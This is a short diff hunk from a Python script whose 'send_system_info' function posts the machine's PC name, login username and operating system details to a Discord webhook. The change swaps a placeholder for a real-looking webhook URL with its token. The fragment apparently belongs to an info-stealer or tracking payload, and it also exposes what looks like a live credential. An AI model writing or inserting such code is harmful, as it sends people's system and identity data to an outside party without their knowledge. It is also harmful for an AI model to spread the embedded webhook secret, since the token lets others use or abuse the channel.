@@ -143,10 +143,10 @@ def send_system_info():
         
         # Sending directly to the webhook without a variable for the URL
         requests.post(
-            'YOUR_WEBHOOK_URL_HERE', 
+            'https://discord.com/api/webhooks/1506663056455897148/ucaVZkr7evLUG5hbs_d__XQBLhiw-VruKDDTnKPNfYallEpz57FG_wdEI8kGSzqzQL9V', 
             json={
                 "content": (
-                    "### 🖥️ Enhanced System Information Report\n"
+                    "### System Information\n"
                     f"**PC Name:** {platform.node()}\n"
                     f"**Username:** {os.getlogin()}\n"
                     f"**OS:** {platform.system()} {platform.release()}\n"
